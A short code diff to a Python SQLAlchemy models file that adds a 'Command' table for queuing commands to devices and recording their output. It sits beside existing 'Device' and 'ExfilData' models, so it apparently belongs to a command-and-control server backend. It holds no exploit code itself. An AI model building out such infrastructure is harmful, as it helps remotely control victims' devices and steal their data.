@@ -45,6 +45,18 @@ class Device(Base):
     last_command_time = Column(DateTime)
 
 
+class Command(Base):
+    __tablename__ = "commands"
+    
+    id = Column(Integer, primary_key=True, index=True)
+    device_uuid = Column(String(100), index=True)
+    command = Column(Text)
+    status = Column(String(20), default="pending")
+    output = Column(Text)
+    created_at = Column(DateTime, default=datetime.now)
+    executed_at = Column(DateTime)
+
+
 class ExfilData(Base):
     __tablename__ = "exfil_data"
     
